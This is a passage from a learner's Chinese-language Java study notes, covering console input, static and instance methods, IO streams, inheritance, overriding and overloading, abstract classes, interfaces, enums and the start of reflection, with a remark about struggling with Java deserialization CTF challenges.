System.out.println(&quot;请输入数字：&quot;);        Scanner scan = new Scanner(System.in);         double sum = 0;        int m = 0;         while (scan.hasNextDouble()) &#123;            double x = scan.nextDouble();            m = m + 1;            sum = sum + x;        &#125;         System.out.println(m + &quot;个数的和为&quot; + sum);        System.out.println(m + &quot;个数的平均值是&quot; + (sum / m));        scan.close();    &#125;&#125;//用double类型代替所有类型的数据进行计算\n\n执行以上程序输出结果为（输入非数字来结束输入）：\n$ javac ScannerDemo.java$ java ScannerDemo请输入数字：12231521.4end4个数的和为71.44个数的平均值是17.85\n\n至于其他方法要的时候再去查吧\n16.静态方法和实例方法我们之前就应该注意到了，为什么输入的时候需要实例化对象然后调用方法，但是当我们输出的时候则可以直接System.out.println调用方法，这就关于java中的静态方法和实例方法\nJava中的方法分为 静态方法（static） 和 实例方法（非static），它们的调用方式不同：\n静态方法\n\n属于类：与类本身关联，而不是与类的任何特定实例关联\n无需实例化：可以直接通过类名调用\n只能访问：静态变量和其他静态方法\n**无this**：不能使用this或super关键字\n\n也就是说我们在访问静态方法的时候可以不通过实例化，直接通过类进行调用\n\n静态方法：属于类，通过类名.方法名()调用\n普通方法：属于对象，通过对象.方法名()调用\n\npublic class Calculator &#123;    // 静态方法 - 存在方法区，类加载时确定    public static int add(int a, int b) &#123;        return a + b;    &#125;        // 普通方法 - 存在方法区，但通过对象调用    private int baseValue;    public int addWithBase(int value) &#123;        return this.baseValue + value; // 需要this访问实例数据    &#125;&#125;\n\n\n\n属于类本身就是在java运行程序之前会提前加载好这些类到堆内存中，堆内存我们之前学字符串的时候遇到过，是专门用于存放对象的地方\n也就是说静态方法不需要实例化是因为在程序运行之前所属类已经在堆内存中加载完毕\n自然静态方法的类中属于final类无法被继承\nMath.max(10, 20);  // Math类的静态方法System.out.println(&quot;Hello&quot;); // System.out 是静态的PrintStream对象\n\n\n\n实例方法\n\n属于对象：每个实例方法都绑定到类的特定实例（对象）上\n需要实例化：必须通过new创建对象后才能调用\n可以访问：实例变量、其他实例方法、静态变量和静态方法\n**隐含this**：方法内部自动包含当前对象的引用（this\n\n在得知静态方法会提前在内存中加载方法后，实例方法则自然是通过代码中的new去进行实例化，但是就会出现一个问题，每次实例化之后的对象都不同，那该如何去区分不同的对象呢\n方法区中的方法代码\n\n共享存储：同一个类的所有实例方法代码只存储一份在方法区（Method Area）\n不随对象复制：即使创建多个对象，实例方法的代码不会重复存储\n\n[方法区]类信息 &#123;  实例方法A的字节码  实例方法B的字节码  静态方法C的字节码&#125;\n\n我们知道这些信息是每个类单独将实例化代码存储后，看下每个对象该如何储存\n每个对象在堆中存储：\n\n对象头（Mark Word、类指针等）\n实例变量（非静态字段）\n(不包含方法代码)\n\n[堆内存]对象1 &#123;  对象头  int age = 25          // 实例变量  String name = &quot;Alice&quot; // 实例变量&#125;对象2 &#123;  对象头  int age = 30  String name = &quot;Bob&quot;&#125;\n\n\n\nthis指针的工作原理\n\n隐式参数：每个实例方法调用时，编译器自动添加一个隐藏参数this\n指向当前对象：this保存着调用该方法的对象的内存地址\n类型安全：编译时确保this类型与当前类匹配\n\n当方法调用时的内存操作\n\nJVM找到对象对应的类信息（通过对象头中的类指针）\n在方法区定位方法代码\n隐式传入this参数：将当前对象的引用作为第一个参数传递\n\n// 源代码public class Person &#123;    private String name;        public void setName(String name) &#123;        this.name = name; // 这里的this就是隐式传入的对象引用    &#125;&#125;// 编译后的等效形式（概念性表示）public static void setName(Person this, String name) &#123;    this.name = name;&#125;\n\n\n\n最后也就是说在我们调用方法的时候编译器会给一个当前对象的地址，然后在类的方法区中找到调用的方法代码，然后再顺着地址去找到存放对象的堆内存中的对象的各个参数然后进行调用\n还有就是在子类继承父类之后关于方法区中对于方法代码的储存\n\n不完全是独立内存：子类不会完全复制父类方法代码到独立区域\n也不是完全共享：重写的方法会存储子类自己的版本，新增方法独立存储\n通过方法表间接引用：子类方法表继承父类结构，但可覆盖重写的方法条目\n\n也就是重写和新增的方法会有特殊的储存方式，其他的和父类一致\n17.Java 流(Stream)、文件(File)和IOJava 中的流（Stream）、文件（File）和 IO（输入输出）是处理数据读取和写入的基础设施，它们允许程序与外部数据（如文件、网络、系统输入等）进行交互。\njava.io 包是 Java 标准库中的一个核心包，提供了用于系统输入和输出的类，它包含了处理数据流（字节流和字符流）、文件读写、序列化以及数据格式化的工具。\njava.io 是处理文件操作、流操作以及低级别 IO 操作的基础包。\njava.io 包中的流支持很多种格式，比如：基本类型、对象、本地化字符集等等。\n一个流可以理解为一个数据的序列。输入流表示从一个源读取数据，输出流表示向一个目标写数据。\n关于包中我们知道了，这是一个在一个目录下将所有类中某些方法都放入包中，然后可以通过import语句引入包后可以调用方法的概念\n读取控制台输入\nJava 的控制台输入由 System.in 完成。\n为了获得一个绑定到控制台的字符流，你可以把 System.in 包装在一个 BufferedReader 对象中来创建一个字符流。\n下面是创建 BufferedReader 的基本语法：\nBufferedReader br = new BufferedReader(new                       InputStreamReader(System.in));//这也就是为什么scanner需要用到System.in作为参数Scanner s = new Scanner(System.in);\n\nBufferedReader 对象创建后，我们便可以使用 read() 方法从控制台读取一个字符，或者用 readLine() 方法读取一个字符串。\n从控制台读取多字符输入\n从 BufferedReader 对象读取一个字符要使用 read() 方法，它的语法如下：\nint read( ) throws IOException//throws IOException 是方法声明的一部分，用于显式声明该方法可能抛出某种类型的异常。\n\n每次调用 read() 方法，它从输入流读取一个字符并把该字符作为整数值返回。 当流结束的时候返回 -1。该方法抛出 IOException。\n下面的程序示范了用 read() 方法从控制台不断读取字符直到用户输入 q。\n//使用 BufferedReader 在控制台读取字符 import java.io.*; public class BRRead &#123;    public static void main(String[] args) throws IOException &#123;        char c;        // 使用 System.in 创建 BufferedReader        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));        System.out.println(&quot;输入字符, 按下 &#x27;q&#x27; 键退出。&quot;);        // 读取字符        do &#123;            c = (char) br.read();            System.out.println(c);        &#125; while (c != &#x27;q&#x27;);    &#125;&#125;\n\n以上实例编译运行结果如下:\n输入字符, 按下 &#x27;q&#x27; 键退出。runoobrunoobqq\n\n\n\n从控制台读取字符串\n从标准输入读取一个字符串需要使用 BufferedReader 的 readLine() 方法。\n它的一般格式是：\nString readLine( ) throws IOException\n\n下面的程序读取和显示字符行直到你输入了单词”end”。\n//使用 BufferedReader 在控制台读取字符import java.io.*; public class BRReadLines &#123;    public static void main(String[] args) throws IOException &#123;        // 使用 System.in 创建 BufferedReader        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));        String str;        System.out.println(&quot;Enter lines of text.&quot;);        System.out.println(&quot;Enter &#x27;end&#x27; to quit.&quot;);        do &#123;            str = br.readLine();            System.out.println(str);        &#125; while (!str.equals(&quot;end&quot;));    &#125;&#125;\n\n\n\n\n\n\n\n\n\n18.接口和类的继承类的继承在php中就学到过了，就是通过extends关键字去继承父类的方法和属性，这样可以减少代码量，实现类的重复使用。相应的可以通过重写方法的操作去改变从父类中继承的方法是和属性\n继承的特性\n\n子类拥有父类非 private 的属性、方法。\n子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。\n子类可以用自己的方式实现父类的方法。\nJava 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 B 类继承 A 类，C 类继承 B 类，所以按照关系就是 B 类是 C 类的父类，A 类是 B 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。\n提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。\n\n继承可以使用 extends 和 implements 这两个关键字来实现继承，而且所有的类都是继承于 java.lang.Object，当一个类没有继承的两个关键字，则默认继承 Object（这个类在 java.lang 包中，所以不需要 import）祖先类\nextends关键字\n在 Java 中，类的继承是单一继承，也就是说，一个子类只能拥有一个父类，所以 extends 只能继承一个类。\npublic class Animal &#123;     private String name;       private int id;     public Animal(String myName, int myid) &#123;         //初始化属性值    &#125;     public void eat() &#123;  //吃东西方法的具体实现  &#125;     public void sleep() &#123; //睡觉方法的具体实现  &#125; &#125;  public class Penguin  extends  Animal&#123; &#125;\n\n\n\nimplements关键字\n使用 implements 关键字可以变相的使java具有多继承的特性，使用范围为类继承接口的情况，可以同时继承多个接口（接口跟接口之间采用逗号分隔）。\npublic interface A &#123;    public void eat();    public void sleep();&#125; public interface B &#123;    public void show();&#125; public class C implements A,B &#123;&#125;\n\n\n\nsuper 与 this 关键字\nsuper 关键字：我们可以通过 super 关键字来实现对父类成员的访问，用来引用当前对象的父类。\nthis 关键字：指向自己的引用，引用当前对象，即它所在的方法或构造函数所属的对象实例。。\nclass Animal &#123;    void eat() &#123;        System.out.println(&quot;animal : eat&quot;);    &#125;&#125; class Dog extends Animal &#123;    void eat() &#123;        System.out.println(&quot;dog : eat&quot;);    &#125;    void eatTest() &#123;        this.eat();   // this 调用自己的方法        super.eat();  // super 调用父类方法    &#125;&#125; public class Test &#123;    public static void main(String[] args) &#123;        Animal a = new Animal();        a.eat();        Dog d = new Dog();        d.eatTest();    &#125;&#125;\n\n这个还是很好理解的\nanimal : eatdog : eatanimal : eat\n\n\n\nfinal 关键字\nfinal 可以用来修饰变量（包括类属性、对象属性、局部变量和形参）、方法（包括类方法和对象方法）和类。\nfinal 含义为 “最终的”。\n使用 final 关键字声明类，就是把类定义定义为最终类，不能被继承，或者用于修饰方法，该方法不能被子类重写：\nfinal修饰变量\n\n被final修饰的变量只能赋值一次，之后不能再修改\n必须显式初始化（直接赋值或在构造器中赋值）\n\nclass MyClass &#123;    final int instanceVar = 10; // 直接初始化    final int anotherVar;        MyClass() &#123;        anotherVar = 20; // 在构造器中初始化    &#125;&#125;\n\n\n\nfinal修饰方法\n\n被final修饰的方法不能被子类重写\n可以重载final方法\n\nclass Parent &#123;    public final void show() &#123;        System.out.println(&quot;Parent show&quot;);    &#125;        public final void show(String msg) &#123; // 重载是允许的        System.out.println(msg);    &#125;&#125;class Child extends Parent &#123;    // @Override public void show() &#123;&#125; // 错误！不能重写final方法&#125;\n\n\n\nfinal修饰类\n\n被final修饰的类不能被继承\n类中所有方法隐式为final（因为无法继承）\n\nfinal class ImmutableClass &#123;    // 类实现&#125;// class SubClass extends ImmutableClass &#123;&#125; // 错误！不能继承final类\n\n\n\n19.重写(Override)与重载(Overload)重写(Override)\n重写（Override）是指子类定义了一个与其父类中具有相同名称、参数列表和返回类型的方法，并且子类方法的实现覆盖了父类方法的实现。 即外壳不变，核心重写！\n重写的好处在于子类可以根据需要，定义特定于自己的行为。也就是说子类能够根据需要实现父类的方法。这样，在使用子类对象调用该方法时，将执行子类中的方法而不是父类中的方法。\n重写方法不能抛出新的检查异常或者比被重写方法申明更加宽泛的异常。例如： 父类的一个方法申明了一个检查异常 IOException，但是在重写这个方法的时候不能抛出 Exception 异常，因为 Exception 是 IOException 的父类，抛出 IOException 异常或者 IOException 的子类异常。\n在面向对象原则里，重写意味着可以重写任何现有方法。实例如下：\nclass Animal&#123;   public void move()&#123;      System.out.println(&quot;动物可以移动&quot;);   &#125;&#125; class Dog extends Animal&#123;   public void move()&#123;      System.out.println(&quot;狗可以跑和走&quot;);   &#125;&#125; public class TestDog&#123;   public static void main(String args[])&#123;      Animal a = new Animal(); // Animal 对象      Animal b = new Dog(); // Dog 对象       a.move();// 执行 Animal 类的方法       b.move();//执行 Dog 类的方法   &#125;&#125;\n\n以上实例编译运行结果如下：\n动物可以移动狗可以跑和走\n\n在上面的例子中可以看到，尽管 b 属于 Animal 类型，但是它运行的是 Dog 类的 move方法。\n这是由于在编译阶段，只是检查参数的引用类型。\n然而在运行时，Java 虚拟机(JVM)指定对象的类型并且运行该对象的方法。\n因此在上面的例子中，之所以能编译成功，是因为 Animal 类中存在 move 方法，然而运行时，运行的是特定对象的方法。\n思考以下例子：\nclass Animal&#123;   public void move()&#123;      System.out.println(&quot;动物可以移动&quot;);   &#125;&#125; class Dog extends Animal&#123;   public void move()&#123;      System.out.println(&quot;狗可以跑和走&quot;);   &#125;   public void bark()&#123;      System.out.println(&quot;狗可以吠叫&quot;);   &#125;&#125; public class TestDog&#123;   public static void main(String args[])&#123;      Animal a = new Animal(); // Animal 对象      Animal b = new Dog(); // Dog 对象 //这里我们可以明显看出问题来了，这实例化的是Dog类，但类型是Animal      a.move();// 执行 Animal 类的方法      b.move();//执行 Dog 类的方法//在有相同方法的时候还是优先执行实例化的对象      b.bark();   &#125;&#125;\n\n以上实例编译运行结果如下：\nTestDog.java:30: cannot find symbolsymbol  : method bark()location: class Animal                b.bark();                 ^//该程序将抛出一个编译错误，因为b的引用类型Animal没有bark方法。\n\n这个很微妙，类型和实例化对象有冲突的情况下调用都存在的方法会优先实例化对象，但是在调用不存在方法后缺失以类型爆的错\n方法的重写规则\n\n参数列表与被重写方法的参数列表必须完全相同。\n返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。\n访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。（父类中可以被访问的子类也必须可以被访问）\n父类的成员方法只能被它的子类重写。\n声明为 final 的方法不能被重写。\n声明为 static 的方法不能被重写，但是能够被再次声明。（这难道不比重写还方便一点吗）\n子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。\n子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。\n重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。\n构造方法不能被重写。\n如果不能继承一个类，则不能重写该类的方法。\n\nsuper关键字\n我们之前知道，this是用来指向当前类的，super则是指向父类的，当我们在类中使用super可以调用父类的被重写的方法\nclass Animal&#123;   public void move()&#123;      System.out.println(&quot;动物可以移动&quot;);   &#125;&#125; class Dog extends Animal&#123;   public void move()&#123;      super.move(); // 应用super类的方法      System.out.println(&quot;狗可以跑和走&quot;);   &#125;&#125; public class TestDog&#123;   public static void main(String args[])&#123;       Animal b = new Dog(); // Dog 对象      b.move(); //执行 Dog类的方法    &#125;&#125;\n\n以上实例编译运行结果如下：\n动物可以移动狗可以跑和走\n\n\n\n重载(Overload)\n重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。\n每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。\n最常用的地方就是构造器的重载。\n重载规则:\n\n被重载的方法必须改变参数列表(参数个数或类型不一样)；\n被重载的方法可以改变返回类型；\n被重载的方法可以改变访问修饰符；\n被重载的方法可以声明新的或更广的检查异常；\n方法能够在同一个类中或者在一个子类中被重载。\n无法以返回值类型作为重载函数的区分标准。\n\n也就是说必须改变参数类型，可以在同一个类中重载也就印证了之前java一个类中可以出现两个名字相同但参数不同的方法，这就是重载、\n也就是说经过重载后可近似看作两个不同的方法，所以修饰符也是可以修改的\npublic class Overloading &#123;    public int test()&#123;        System.out.println(&quot;test1&quot;);        return 1;    &#125;     public void test(int a)&#123;        System.out.println(&quot;test2&quot;);    &#125;        //以下两个参数类型顺序不同    public String test(int a,String s)&#123;        System.out.println(&quot;test3&quot;);        return &quot;returntest3&quot;;    &#125;        public String test(String s,int a)&#123;        System.out.println(&quot;test4&quot;);        return &quot;returntest4&quot;;    &#125;   //同一个类中的重载     public static void main(String[] args)&#123;        Overloading o = new Overloading();        System.out.println(o.test());        o.test(1);        System.out.println(o.test(1,&quot;test3&quot;));        System.out.println(o.test(&quot;test4&quot;,1));    &#125;&#125;\n\n\n\n重写与重载的区别\n\n\n\n区别点\n重载方法\n重写方法\n\n\n\n参数列表\n必须修改\n一定不能修改\n\n\n返回类型\n可以修改\n一定不能修改\n\n\n异常\n可以修改\n可以减少或删除，一定不能抛出新的或者更广的异常\n\n\n访问\n可以修改\n一定不能做更严格的限制（可以降低限制）\n\n\n20.抽象类在面向对象的概念中，所有的对象都是通过类来描绘的，但是反过来，并不是所有的类都是用来描绘对象的，如果一个类中没有包含足够的信息来描绘一个具体的对象，这样的类就是抽象类。\n抽象类除了不能实例化对象之外，类的其它功能依然存在，成员变量、成员方法和构造方法的访问方式和普通类一样。\n由于抽象类不能实例化对象，所以抽象类必须被继承，才能被使用。也是因为这个原因，通常在设计阶段决定要不要设计抽象类。\n父类包含了子类集合的常见的方法，但是由于父类本身是抽象的，所以不能使用这些方法。\n在 Java 中抽象类表示的是一种继承关系，一个类只能继承一个抽象类，而一个类却可以实现多个接口。\n和抽象类中还有抽象方法的这个概念，在抽象类中不会去定义抽象方法的行为，行为由子类必须制定，这应该就是为什么抽象类只能被继承而不能被实例化的原因\n在 Java 语言中使用 abstract class 来定义抽象类。如下实例：\n/* 文件名 : Employee.java */public abstract class Employee&#123;   private String name;   private String address;   private int number;   public Employee(String name, String address, int number)   &#123;      System.out.println(&quot;Constructing an Employee&quot;);      this.name = name;      this.address = address;      this.number = number;   &#125;   public double computePay()   &#123;     System.out.println(&quot;Inside Employee computePay&quot;);     return 0.0;   &#125;   public void mailCheck()   &#123;      System.out.println(&quot;Mailing a check to &quot; + this.name       + &quot; &quot; + this.address);   &#125;&#125;\n\n也就是说我认为除了在抽象方法这个定义上其他和普通类没什么区别\n抽象方法\n如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。\nAbstract 关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。\n抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。\npublic abstract class Employee&#123;   private String name;   private String address;   private int number;      public abstract double computePay();      //其余代码&#125;\n\n声明抽象方法会造成以下两个结果：\n\n如果一个类包含抽象方法，那么该类必须是抽象类。\n任何子类必须重写父类的抽象方法，或者声明自身为抽象类。\n\n继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。\n如果Salary类继承了Employee类，那么它必须实现computePay()方法：\n/* 文件名 : Salary.java */public class Salary extends Employee&#123;   private double salary; // Annual salary     public double computePay()   &#123;      System.out.println(&quot;Computing salary pay for &quot; + getName());      return salary/52;   &#125;    //其余代码&#125;\n\n\n\n\n\\1. 抽象类不能被实例化(初学者很容易犯的错)，如果被实例化，就会报错，编译无法通过。只有抽象类的非抽象子类可以创建对象。\n\\2. 抽象类中不一定包含抽象方法，但是有抽象方法的类必定是抽象类。\n\\3. 抽象类中的抽象方法只是声明，不包含方法体，就是不给出方法的具体实现也就是方法的具体功能。\n\\4. 构造方法，类方法（用 static 修饰的方法）不能声明为抽象方法。\n\\5. 抽象类的子类必须给出抽象类中的抽象方法的具体实现，除非该子类也是抽象类。\n\n\n\n\n特性\n抽象类\n普通类\n接口\n\n\n\n能否实例化\n❌ 不能\n✅ 能\n❌ 不能\n\n\n包含抽象方法\n✅ 可以\n❌ 不能\n✅ 默认全是抽象方法（Java 8 前）\n\n\n方法实现\n可以有具体方法\n必须有具体方法\nJava 8 后可以用 default 方法\n\n\n用途\n定义部分共性的模板（半成品）\n定义完整功能\n定义纯行为规范（契约）\n\n\n21.接口我们之前知道了抽象类中可以出现抽象方法，抽象方法不需要有行为，而是由子类重写，才能进行实例化\njava中还有一个方法的集合，不是用于类的继承，而是用于类实现接口，类必须包含接口中所有方法\n接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。\n接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。\n除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。\n接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。\n接口与类相似点：\n\n一个接口可以有多个方法。\n接口文件保存在 .java 结尾的文件中，文件名使用接口名。(这个和.java文件中只能有一个public的类一样，文件名和类名也必须一致)\n接口的字节码文件保存在 .class 结尾的文件中。\n接口相应的字节码文件必须在与包名称相匹配的目录结构中。\n\n一个 .java 文件中可以同时包含 public 类和非 public 接口，或者 public 接口和非 public 类(也就是说只能有一个public类型)\n接口与类的区别：\n\n接口不能用于实例化对象。\n接口没有构造方法。\n接口中所有的方法必须是抽象方法，Java 8 之后 接口中可以使用 default 关键字修饰的非抽象方法。\n接口不能包含成员变量，除了 static 和 final 变量(由于这两个变量不能被继承)\n接口不是被类继承了，而是要被类实现。\n接口支持多继承。(这是因为里面全是抽象方法，出现同名同参数的则作为一个方法进行重写)\n\n接口特性\n\n接口中每一个方法也是隐式抽象的,接口中的方法会被隐式的指定为 public abstract（只能是 public abstract，其他修饰符都会报错）。\n接口中可以含有变量，但是接口中的变量会被隐式的指定为 public static final 变量（并且只能是 public，用 private 修饰会报编译错误）。\n接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。\n\n抽象类和接口的区别\n\n\\1. 抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。(也就是接口中的方法必须全为抽象变量)\n\\2. 抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 public static final 类型的。\n\\3. 接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。\n\\4. 一个类只能继承一个抽象类，而一个类却可以实现多个接口。\n\n接口的声明\n[可见度] interface 接口名称 [extends 其他的接口名] &#123;        // 声明变量        // 抽象方法&#125;\n\nInterface关键字用来声明一个接口。下面是接口声明的一个简单例子。\n/* 文件名 : NameOfInterface.java */import java.lang.*;//引入包 public interface NameOfInterface&#123;   //任何类型 final, static 字段   //抽象方法&#125;/* 文件名 : Animal.java */interface Animal &#123;   public void eat();   public void travel();&#125;\n\n\n接口是隐式抽象的，当声明一个接口的时候，不必使用abstract关键字。\n接口中每一个方法也是隐式抽象的，声明时同样不需要abstract关键字。\n接口中的方法都是公有的。\n\n也就是说明明和抽象类一样不能直接用，但是却因为接口是隐式抽象不用使用abstract\n接口的实现\n当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。\n类使用implements关键字实现接口。在类声明中，Implements关键字放在class声明后面。\n实现一个接口的语法，可以使用这个公式：\n...implements 接口名称[, 其他接口名称, 其他接口名称..., ...] ...\n\n实例\n/* 文件名 : MammalInt.java */public class MammalInt implements Animal&#123;    public void eat()&#123;      System.out.println(&quot;Mammal eats&quot;);   &#125;    public void travel()&#123;      System.out.println(&quot;Mammal travels&quot;);   &#125;     public int noOfLegs()&#123;      return 0;   &#125;    public static void main(String args[])&#123;      MammalInt m = new MammalInt();      m.eat();      m.travel();   &#125;&#125;//Mammal eats//Mammal travels\n\n重写接口中声明的方法时，需要注意以下规则：\n\n类在实现接口的方法时，不能抛出强制性异常，只能在接口中，或者继承接口的抽象类中抛出该强制性异常。\n类在重写方法时要保持一致的方法名，并且应该保持相同或者相兼容的返回值类型。\n如果实现接口的类是抽象类，那么就没必要实现该接口的方法。\n\n在实现接口的时候，也要注意一些规则：\n\n一个类可以同时实现多个接口。\n一个类只能继承一个类，但是能实现多个接口。\n一个接口能继承另一个接口，这和类之间的继承比较相似。\n\n接口的继承\n一个接口能继承另一个接口，和类之间的继承方式比较相似。接口的继承使用extends关键字，子接口继承父接口的方法。\n// 文件名: Sports.javapublic interface Sports&#123;   public void setHomeTeam(String name);   public void setVisitingTeam(String name);&#125; // 文件名: Football.javapublic interface Football extends Sports&#123;   public void homeTeamScored(int points);   public void visitingTeamScored(int points);   public void endOfQuarter(int quarter);&#125; // 文件名: Hockey.javapublic interface Hockey extends Sports&#123;   public void homeGoalScored();   public void visitingGoalScored();   public void endOfPeriod(int period);   public void overtimePeriod(int ot);&#125;\n\n\n\n和类实现接口一样，接口也可以继承多个接口\npublic interface Hockey extends Sports, Event\n\n\n\n\n\n22.枚举类Java 枚举是一个特殊的类，一般表示一组常量，比如一年的 4 个季节，一年的 12 个月份，一个星期的 7 天，方向有东南西北等。\nJava 枚举类使用 enum 关键字来定义，各个常量使用逗号 , 来分割。\n例如定义一个颜色的枚举类。\nenum Color&#123;    RED, GREEN, BLUE;&#125; public class Test&#123;    // 执行输出结果    public static void main(String[] args)    &#123;        Color c1 = Color.RED;        System.out.println(c1);    &#125;&#125;//输出//RED\n\n枚举类中不仅可以用于存放变量方法和构造函数，但目前不知道这个枚举类的意义难道就在于通过.字符串访问字符串吗\n内部类中使用枚举\n枚举类也可以声明在内部类中：\npublic class Test &#123;     enum Color     &#123;         RED, GREEN, BLUE;     &#125;       // 执行输出结果    public static void main(String[] args)     &#123;         Color c1 = Color.RED;         System.out.println(c1);     &#125; &#125;//RED\n\n我们可以看到实际上枚举的类型是一个对象，然后是通过Color.RED访问到这个对象，这就可以说明\n每个枚举都是通过 Class 在内部实现的，且所有的枚举值都是 public static final 的。\n以上的枚举类 Color 转化在内部类实现：\nclass Color&#123;     public static final Color RED = new Color();     public static final Color BLUE = new Color();     public static final Color GREEN = new Color();&#125;\n\n这也就是说每个元素其实是public static final的当前对象，只是对象名不一致\n但是至于为什么System.out.println(c1);会输出RED这个则是和枚举类实际上是继承自java.lang.Enum类，估计是继承的某些方法实现了\n枚举类成员\n枚举跟普通类一样可以用自己的变量、方法和构造函数，构造函数只能使用 private 访问修饰符，所以外部无法调用。\n枚举既可以包含具体方法，也可以包含抽象方法。 如果枚举类具有抽象方法，则枚举类的每个实例都必须实现它。\nenum Color &#123;     RED, GREEN, BLUE;       // 构造函数    private Color()     &#123;         System.out.println(&quot;Constructor called for : &quot; + this.toString());     &#125;       public void colorInfo()     &#123;         System.out.println(&quot;Universal Color&quot;);     &#125; &#125;   public class Test &#123;         // 输出    public static void main(String[] args)     &#123;         Color c1 = Color.RED;         System.out.println(c1);         c1.colorInfo();     &#125; &#125;\n\n输出结果为\nConstructor called for : REDConstructor called for : GREENConstructor called for : BLUEREDUniversal Color\n\n\n\n23.反射无语了，为什么都现在了还是连java反序列化都看不懂，java为啥比php难怎么多啊。好几天了，结果连一个题目都看不懂，CTF为什么没有java的简单题，搞不好是自己太菜了。\nJava 反射（Reflection）是一个强大的特性，它允许程序在运行时查询、访问和修改类、接口、字段和方法的信息。反射提供了一种动态地操作类的能力，这在很多框架和库中被广泛使用，例如Spring框架的依赖注入。\n这个解释还是太吃理解了，看了好一会才知道这个不就是可以通过反射区对类的一些信息进行访问修改等操作吗。\n然后反射可以实现的基础就在于，每个类在 JVM 中都有一个与之相关的 Class 对象(不是new出来的对象，而是jvm自动为每个类创建的)。也就是说这个Class对象对应着我们代码的每个类，然后我们可以通过类对应的Class类进行反射，但实际上也不止有Class这个来进行反射\n通过Class对象只能获得一些基础信息，想要修改调用方法和属性需要使用其他\nJava 的反射 API 提供了一系列的类和接口来操作 Class 对象。主要的类包括：\n\n**java.lang.Class**：表示类的对象。提供了方法来获取类的字段、方法、构造函数等。\n**java.lang.reflect.Field**：表示类的字段（属性）。提供了访问和修改字段的能力。\n**java.lang.reflect.Method**：表示类的方法。提供了调用方法的能力。\n**java.lang.reflect.Constructor**：表示类的构造函数。提供了创建对象的能力。\n\n工作流程\n\n获取 Class 对象：首先获取目标类的 Class 对象。\n获取成员信息：通过 Class 对象，可以获取类的字段、方法、构造函数等信息。\n操作成员：通过反射 API 可以读取和修改字段的值、调用方法以及创建对象。\n\n先来看一段示例代码\nimport java.lang.reflect.Field;import java.lang.reflect.Method;public class ReflectionDemo1 &#123;    public static void main(String[] args) throws Exception &#123;        // 1. 获取类的Class对象（三种方式任选其一）        Class&lt;?&gt; clazz = Class.forName(&quot;java.lang.String&quot;); // 最常用：通过全类名加载 这里全类名是&#x27;java.lang.String&#x27;        // Class&lt;String&gt; clazz = String.class;              // 直接通过类名.class  由于静态类不能重名所以可以直接使用类名        // Class&lt;?&gt; clazz = &quot;Hello&quot;.getClass();            // 通过对象实例获取  通过getClass获取Class对象        // 2. 打印类的基本信息        System.out.println(&quot;===== 类的基本信息 =====&quot;);        System.out.println(&quot;类名: &quot; + clazz.getName());      // 输出全限定类名（java.lang.String）        System.out.println(&quot;简单类名: &quot; + clazz.getSimpleName()); // 输出类名（String）        System.out.println(&quot;是否是接口: &quot; + clazz.isInterface()); // 检查是否是接口        // 3. 获取所有公共字段（public修饰的成员变量）        System.out.println(&quot;\\n===== 公共字段 =====&quot;);        Field[] fields = clazz.getFields(); // 获取所有public字段（String类没有public字段，所以数组为空）        for (Field field : fields) &#123;            System.out.println(&quot;字段名: &quot; + field.getName());        &#125;        // 4. 获取所有公共方法（包括继承的方法）        System.out.println(&quot;\\n===== 公共方法 =====&quot;);        Method[] methods = clazz.getMethods();        for (Method method : methods) &#123;            System.out.println(&quot;方法名: &quot; + method.getName() +                               &quot;, 返回值类型: &quot; + method.getReturnType().getSimpleName());            // 可以继续打印参数列表等        &#125;    &#125;&#125;\n\n\n\n我们再仔细分析一下关键代码\nClass&lt;?&gt; clazz = Class.forName(&quot;java.lang.String&quot;);//通过全类名获取Class&lt;?&gt; clazz = String.class;//通过类名获取String str = &quot;Hello&quot;;Class&lt;?&gt; clazz = str.getClass();//通过对象获取Object obj = clazz.getDeclaredConstructor().newInstance();//创建对象//getDeclaredConstructor()这个是获取类构造方法的方法//newInstance()构造方法创建对象，具体怎么创建不知道\n\n\n\n对类的各种访问\n//可以通过反射访问和修改类的字段：Class&lt;?&gt; clazz = Person.class;Field field = clazz.getDeclaredField(&quot;name&quot;);field.setAccessible(true); // 如果字段是私有的，需要设置为可访问Object value = field.get(personInstance); // 获取字段值field.set(personInstance, &quot;New Name&quot;); // 设置字段值//可以通过反射调用类的方法Class&lt;?&gt; clazz = Person.class;Method method = 